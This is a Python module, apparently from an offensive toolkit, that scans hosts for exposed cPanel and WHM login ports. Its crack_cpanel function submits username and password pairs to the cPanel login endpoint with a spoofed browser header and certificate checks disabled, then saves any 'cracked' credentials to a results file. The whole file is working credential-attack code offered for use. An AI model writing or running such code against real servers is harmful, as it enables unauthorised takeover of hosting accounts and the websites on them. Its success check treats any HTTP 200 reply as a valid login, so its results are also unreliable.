import requests
from modules.utils import save_result, setup_logging
from colorama import Fore

FR = Fore.RED
FY = Fore.YELLOW
FW = Fore.WHITE
FG = Fore.GREEN
FC = Fore.CYAN
FRT = Fore.RESET

logger = setup_logging()

def check_cpanel(url):
    logger.info(f"Checking cPanel {url}")
    try:
        response = requests.get(f'https://{url}:2083', timeout=10, verify=False)
        if response.status_code == 200:
            logger.info(f"{FG}[cPanel]{FRT} - Found: https://{url}:2083")
            save_result("Results/cPanel.txt", f"[+] cPanel: https://{url}:2083\n")
            return True
    except:
        pass
    return False
        
        
def check_whm(url):
    logger.info(f"Checking WHM {url}")
    try:
        response = requests.get(f'https://{url}:2087', timeout=10, verify=False)
        if response.status_code == 200:
            logger.info(f"{FG}[WHM]{FRT} - Found: https://{url}:2087")
            save_result("Results/WHM.txt", f"[+] cPanel: https://{url}:2087\n")
            return True
    except:
        pass
    return False
        

def crack_cpanel(url, username, password):
    """Attempt to crack cPanel login with the given credentials."""
    logger.info(f"Attempting to crack cPanel login for {url} with username: {username}, password: {password}")
    endpoint = "/login/?login_only=1"
    full_url = f'https://{url}:2083{endpoint}'
    payload = {
        "user": username,
        "pass": password,
        "goto_uri": "/"
    }
    headers = {
        'Content-type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'Origin': f'https://{url}:2083',
        'Referer': f'https://{url}:2083/',
        'Connection': 'keep-alive'
    }
    try:
        response = requests.post(full_url, data=payload, headers=headers, verify=False)
        response.raise_for_status()
        if response.status_code == 200:
            logger.info(f"{FG}[cPanel/WHM]{FRT} - [Cracked!] - https://{url}:2083 - {username}|{password}")
            save_result("Results/Cracked.txt", f"[+] URL: https://{url}:2083\n[+] Username: {username}\n[+] Password: {password}\n\n")
        else:
            print(f"[cPanel/WHM] - [Invalid!] - https://{url}:2083 - {username}|{password}")
    except requests.exceptions.RequestException as e:
        pass